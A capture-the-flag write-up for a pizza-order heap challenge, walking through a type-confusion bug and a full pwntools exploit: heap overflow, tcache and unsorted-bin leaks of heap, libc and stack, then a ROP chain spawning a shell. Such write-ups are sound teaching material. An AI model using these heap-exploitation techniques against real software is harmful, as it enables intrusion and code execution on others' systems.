# The binary
This challenge is a pizza-place simulator; as soon as you run it you're prompted with some options:
```
 1. Order a pizza
 2. Cancel order
 3. Get your baked pizza
 4. Modify order
 5. Show orders
 6. Get your pizzas and go!
 >
```

When you order a pizza you get asked the order number, the size of your name, your name, the type of the pizza, the size of its description, and the description:
```
Order number? 0
How long's your name? 10
Name please: marco
What type of pizza do you want? 
 0. Low
 1. Medium
 2. High
 > 1
How long's the description? 80
Ok, tell me what do you want on the pizza: margherita
You order has been placed! It's going to be baked and ready soon!
```

Orders are stored globally in an array: `Order_t pizza_orders[3]`, and each one looks like this:
```c
struct {
	float price;
	unsigned short id;
	bool baked;
	uint8_t pizza_type;
	unsigned short name_size;
	/* 6 bytes of padding here */
	char* name;
	unsigned short description_size;
	/* 6 more bytes of padding here */
	char* description;
} Order_t;
```
The padding is to align the pointers to 8 bytes.

Some info about orders:
- The order number we provide when ordering a pizza is the index used to place the order in this array.
- The price can be completely ignored, it's not actually relevant to the challenge.
- The `id` field in the struct is a unique incremental (starting from 0) number given to each order, based on a global counter `order_num`.
- Orders start with `baked` set to false, modifying an order sets `baked` to true, and it means you can't modify it anymore.
- The `pizza_type` is pretty useless.

Cancelling an order free's it and empties its slot in the orders array, "getting your baked pizza" is the same thing as cancelling it, modifying it lets us re-read the name and description (only once), showing our orders lets us read all the info about all of our up to 3 orders, and the last option lets us exit the program (via a `return`) if we have no pending orders.

# The vulnerability
Here's a simplified version of the function used to place orders:
```c
Order_t pizza_orders[3];
unsigned short order_num = 0;

void new_order() {
	unsigned short order_number;
	read_num(&order_number);
	
	// there's only space for 3 orders
	if (order_number >= 3)
		err("...");

	// slot already occupied
	if (pizza_orders[order_number] != NULL)
		err("...");

	Order_t* order = (Order_t*)malloc(sizeof(Order_t));
	pizza_orders[order_number] = order;
	if (order == NULL)
		err("...");

	order->id = order_number++;
	order->baked = false;
	
	read_num(&order->name_size);
	// name too big
	if (order->name_size > 0x100)
		err("...");
	order->name = (char*)malloc(order->name_size);
	if (order->name == NULL)
		err("...");
	fgets(order->name, order->name_size, stdin);

	read_num(&order->pizza_type);
	// only 0, 1, and 2
	if (order->pizza_type > 2)
		err("...");

	read_num(&order->description_size);
	// description too big
	if (order->description_size > 0x100)
		err("...");
	order->description = (char*)malloc(order->description_size);
	if (order->description == NULL)
		err("...");
	fgets(order->description, order->description_size, stdin);
}
```
The `read_num` function takes in a `unsigned short*` and reads it with `scanf`.

The problem is on this line:
```c
read_num(&order->pizza_type);
```
The `pizza_type` field is a `uint8_t`, but it treats it as an `unsigned short`, which would overlap with the `name_size` field.
If you set the type to 0xFF00 for example, you will see that the type will be 0, and the lower byte of `name_size` will have become 0xFF.

# The attack
The idea is to place an order with a small name, and then use the bug to make its `name_size` bigger, which lets us overflow when we modify the order.

What can we do with this overflow? Let's look at what's on the heap if we have 2 placed orders (assuming no free'd stuff hanging around):
```
+------------+
| 1st struct |
+------------+
|  1st name  |  <-- overflow from here downwards
+------------+
|  1st desc  |
+------------+
| 2nd struct |
+------------+
|  2nd name  |
+------------+
|  2nd desc  |
+------------+
```

If we fake the 1st order's `name_size`, we'll be able to overwrite the 2nd order's struct, its sizes and its pointers. We have no leak and the binary is PIE, so we can't set `name` to any address, but if we could move it so that it points to another chunk, and then free that chunk, we could leak the heap by reading there because we'd be reading some bin's forward pointer.

We can do a partial overwrite, specifically, our name is read with `fgets`, which puts a null-terminator at the end of the string, so we can read up until before the name and turn its LSB into 0.
If we do that, and if we choose the right sizes for the name of the 1st order (we want a 0x30 chunk, so at least 32), then the 2nd order's name will point at the start of the 1st order's description.

Now if we free the 1st order, its chunks will be placed in the tcache, and the start of every chunk will contain tcache forward pointers, and we can now read one of these by reading the 2nd order's name, so we've leaked the heap! :D

(Note for all these snippets: `mk_order()` is a function that returns the byte representation of an order, possibly a partial representation depending on how many parameters it's passed)
```python
io = conn()

# make a 1st order to overflow from
order(io, 0, 32, b'A', 5, b'B', 0xff00)

# make a 2nd order to overflow into
order(io, 1, 5, b'A', 5, b'B', 0)

# overflow into the 2nd order and put fgets' null terminator onto its name ptr's LSB
# also make its name size very big
payload =\
	b'A'*40 +\
	p64(0x21) + b'A'*24 +\
	p64(0x31) + mk_order(0, 0, False, 0, 0xffff) + b'A'*5
modify(io, 0, payload, b'B')

# now free the 1st order, and since the 2nd order's name now points to the 1st description, if you read it you'll see a tcache fd
cancel(io, 0)
heap = u64(show(io)[0].name.ljust(8, b'\0')) << 12
log.info(f"heap @ 0x{heap:x}")
```

Now that we've leaked the heap, we can redo this trick, but completely overwrite the name, and we effectively have arbitrary rw on the heap.  This isn't enough to spawn a shell, we need to somehow leak something else.
My idea was to fake a 0x500 chunk and free it, and since it'd be placed in the unsorted bin, i'd have a pointer to `main_arena` that i could read to leak libc.

To do this we have to:
- Create and free enough orders to have at least 0x500 bytes of free space on the heap, i made 2 orders with 0x100 sized names and descriptions, and one order with a 0x90 name.
```python
order(io, 0, 0x100, b'A', 0x100, b'B', 0)
order(io, 2, 0x100, b'A', 0x100, b'B', 0)
cancel(io, 2)
cancel(io, 0)
order(io, 0, 0x90, b'A', 0x90, b'B', 0xff00) # the 0x500 chunk will end in the middle of this order's name
```
- Make an order which occupies a chunk at the start of this free area (doesn't matter if it's the struct, the name, or the description).
```python
order(io, 2, 0x100, b'A', 5, b'B', 0)
```
- Use our overflow to overwrite this first chunk's size and make it 0x500.
```python
payload = flat({
	0: heap << 12,
	0x18: 0x31,
	0x20: mk_order(0, 0, False, 0, 0xffff, heap + 0x300, 0xffff, heap + 0x370),
	0x48: 0x21,
	0x68: 0x21,
	0x88: 0x501
})
modify(io, 1, payload, b'B')
```
- The 0x500 chunk will end in the middle of some chunk ahead, we need to have put a fake size in there that covers the excess and goes up to the top chunk; using the sizes i listed before, 4 0x100 chunks, 1 0x90 chunk, and a few 0x30 chunks since there's the structs, i had to use a fake size of 0x80 to get up to the top chunk.
```python
modify(io, 0, b'A', b'B'*24 + p64(0x81))
```
- Free that order!
```python
# free this huge chunk, it'll go in the unsorted bin and a libc pointer will end up in the heap
cancel(io, 2)
# we also don't need this one anymore
cancel(io, 0)
```

After this, we can re-overwrite an order's name pointer to place it on this libc pointer, and read it to leak libc! :DD

```python
# there's some free space before the 2nd order, we'll use it from now on to put an order, and overflow it into the 2nd order to move its name
fake_name = lambda addr: flat({
	0x28: 0x21,
	0x48: 0x31,
	0x50: mk_order(0, 0, False, 0, 0xffff, addr),
})

# first move it onto the libc pointer
order(io, 0, 32, b'A', 5, b'B', 0xff00)
modify(io, 0, fake_name(heap + 0x390), b'B')

# now we can read the 2nd order's name to leak libc
libc.address = u64(show(io)[1].name.ljust(8, b'\0')) - libc.sym.main_arena - 96
log.info(f"libc @ 0x{libc.address:x}")
```

Now i just placed the name on environ to leak the stack:
```python
cancel(io, 0)
order(io, 0, 32, b'A', 5, b'B', 0xff00)
modify(io, 0, fake_name(libc.sym.environ), b'B')
environ = u64(show(io)[1].name.ljust(8, b'\0'))
log.info(f"stack @ 0x{environ:x}")
```

And then i placed it onto main's return pointer and i overwrote it with a ROP chain.
```python
cancel(io, 0)
main_ret = environ - 0x120
aleak("main's ret ptr", main_ret)
order(io, 0, 32, b'A', 5, b'B', 0xff00)
modify(io, 0, fake_name(main_ret), b'B')

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\0")))
modify(io, 1, rop.chain(), b'B')
```

In order to exit the program we have to free all the orders, so i overwrote it one last time to put it back into its original place so that `free()` wouldn't crash.
```python
# move the name back onto its original chunk so it can be freed
cancel(io, 0)
order(io, 0, 32, b'A', 5, b'B', 0xff00)
modify(io, 0, fake_name(heap + 0x350), b'B')

# now free everything
cancel(io, 0)
cancel(io, 1)
```

Now we simply return form main:
```python
leave(io)
```

And BOOM! We've popped a shell!!!!

I haven't done many heap challenges and this was a really really fun challenge for me to work on, although admittedly it took me considerably more time to spot the vulnerability and manage to use it, than to write the rest of the exploit.